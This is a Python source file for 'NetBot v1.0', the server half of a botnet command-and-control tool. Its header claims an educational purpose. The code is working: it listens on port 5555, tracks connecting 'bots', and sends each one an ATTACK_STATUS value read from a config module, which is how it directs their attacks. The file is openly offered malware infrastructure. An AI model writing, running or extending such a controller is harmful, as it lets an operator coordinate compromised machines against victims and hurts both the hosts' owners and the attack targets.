#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used for educational, research purposes and internal use only.
#



import socket
import threading
from termcolor import colored
from importlib import reload

print (""" ______             ______             
|  ___ \       _   (____  \       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\____)\___)______/ \___/ \___)1.0 from https://github.com/skavngr
                                       """)


def config():
	import netbot_config
	netbot_config = reload(netbot_config)
	return netbot_config.ATTACK_STATUS
	 

def threaded(c):
	while True:
		data = c.recv(1024)
		if not data:
			global connected
			connected = connected - 1;
			print('\x1b[0;30;41m' + ' Bot went Offline! ' + '\x1b[0m','Disconnected from CCC :', c.getpeername()[0], ':', c.getpeername()[1], '\x1b[6;30;43m' + ' Total Bots Connected:', connected,  '\x1b[0m')
			break
		c.send(config().encode())

	#c.close() #No issues commented earlier.


def Main():
	host = "0.0.0.0"
	port = 5555
	global connected
	connected = 0

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(50)
	while True:

		c, addr = s.accept()
		connected = connected + 1;
		print('\x1b[0;30;42m' + ' Bot is now Online! ' + '\x1b[0m','Connected to CCC :', addr[0], ':', addr[1], '\x1b[6;30;43m' + ' Total Bots Connected:', connected,  '\x1b[0m')

		threading.Thread(target=threaded, args=(c,)).start()
	
	#s.close() #No issues uncommented earlier.


if __name__ == '__main__':
	Main()
